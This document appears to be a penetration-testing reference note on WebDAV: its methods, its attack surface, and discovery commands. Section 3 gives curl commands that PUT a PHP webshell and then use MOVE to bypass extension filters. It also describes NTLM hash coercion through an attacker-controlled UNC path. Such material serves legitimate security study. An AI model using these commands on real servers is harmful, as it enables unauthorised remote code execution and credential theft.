**WebDAV** (**Web Distributed Authoring and Versioning**, defined in **RFC 4918**) is an extension of the HTTP/1.1 protocol that enables clients to perform remote web content authoring operations.

It transforms a standard HTTP web server into a collaborative, read/write network file system, allowing users to create, edit, move, lock, and delete files directly on the remote server over standard web ports (80/443).

```
                      ┌────────────────────────────────────────┐
                      │             WebDAV Client              │
                      │ (Windows Explorer, Cadaver, cURL, etc) │
                      └──────────────────┬─────────────────────┘
                                         │
                   HTTP Request with WebDAV Methods (PROPFIND, PUT, MKCOL...)
                                         │
                                         ▼
                      ┌────────────────────────────────────────┐
                      │             Web Server                 │
                      │  (Apache mod_dav, IIS WebDAV, Nginx)   │
                      └──────────────────┬─────────────────────┘
                                         │
                               Reads/Writes Files
                                         │
                                         ▼
                      ┌────────────────────────────────────────┐
                      │          Server Filesystem             │
                      │      (/var/www/html/ or C:\inetpub\)   │
                      └────────────────────────────────────────┘

```

---

## 1. Custom HTTP Methods Introduced by WebDAV

WebDAV extends traditional HTTP verbs (`GET`, `POST`, `HEAD`, `OPTIONS`) with filesystem-oriented methods:

* `PROPFIND`: Retrieves metadata and structural properties (such as directory listings, author, creation date) encoded in XML.
* `PROPPATCH`: Modifies or deletes specific properties of a resource.
* `MKCOL` (*Make Collection*): Creates new directories or collections on the remote server.
* `COPY` / `MOVE`: Duplicates or relocates files and directory structures across paths.
* `LOCK` / `UNLOCK`: Implements resource-locking mechanisms to prevent concurrent write collisions (overwriting) by multiple authors.
* `PUT` / `DELETE`: Standard HTTP methods heavily utilized by WebDAV to upload new files or remove remote resources.

---

## 2. Offensive Security & Bug Hunting Impact

From a penetration testing and bug bounty perspective, exposed or misconfigured WebDAV modules are high-value targets for several critical attack vectors:

* **Arbitrary File Upload to RCE:**
* If authentication is weak or missing, attackers can execute a `PUT` request to upload a webshell (e.g., `.php`, `.asp`, `.aspx`, `.jsp`).
* *Extension Blacklist Bypass via `MOVE`:* If direct `PUT` of executable files like `shell.php` is blocked by an application filter, an attacker uploads `shell.txt` via `PUT`, then issues a `MOVE` request with `Destination: /shell.php` to bypass upload filters.


* **Sensitive Information Disclosure:**
* The `PROPFIND` method often leaks complete internal file paths, hidden backup files, directory trees, and internal server configuration details in its XML responses.


* **Authentication Bypasses & Weak Credentials:**
* WebDAV frequently relies on standard HTTP Basic or Digest authentication, making it vulnerable to brute-force attacks via credential spraying if rate-limiting is absent.


* **NTLM Hash Stealing (Coerced Authentication):**
* Windows systems natively support WebDAV via the `WebClient` service. Attackers can use UNC paths pointing to an attacker-controlled WebDAV server (e.g., `\\attacker-ip@80\share`) to trigger automatic NTLM hash transmission for offline cracking or NTLM Relay attacks.



---

## 3. Practical Discovery & Exploitation Commands

### A. Reconnaissance via `OPTIONS` (cURL)

Identify if WebDAV is enabled by inspecting the `Allow` and `DAV` response headers:

```bash
curl -i -X OPTIONS https://target.com/webdav/

```

*Look for:* `DAV: 1, 2` and methods like `PROPFIND, MKCOL, LOCK, PUT`.

### B. Directory Enumeration (`PROPFIND`)

Query the directory structure:

```bash
curl -X PROPFIND -H "Depth: 1" https://target.com/webdav/

```

### C. File Upload and Execution (`PUT` + `MOVE`)

```bash
# 1. Upload benign extension
curl -X PUT -d "<?php system(\$_GET['cmd']); ?>" https://target.com/webdav/shell.txt

# 2. Rename to executable extension
curl -X MOVE -H "Destination: https://target.com/webdav/shell.php" https://target.com/webdav/shell.txt

```

### D. Dedicated Automation Tools

* `davtest`: Automates testing of WebDAV configurations by attempting to upload executable files of various types (`.php`, `.asp`, `.jsp`, `.html`).
* `cadaver`: Command-line WebDAV client supporting an FTP-like interface for manual file manipulation.

---

> **Key Insight:** WebDAV turns web endpoints into writeable file systems. When auditing an application, check the `OPTIONS` response header for `DAV:` compliance; if methods like `PUT` and `MOVE` are allowed on an upload directory without strict extension enforcement, you can often achieve an immediate transition to Remote Code Execution (RCE).
<img width="700" height="800" alt="image" src="https://github.com/user-attachments/assets/6cef00cf-dfd8-41f5-a2b8-b7ed9409f4b6" />
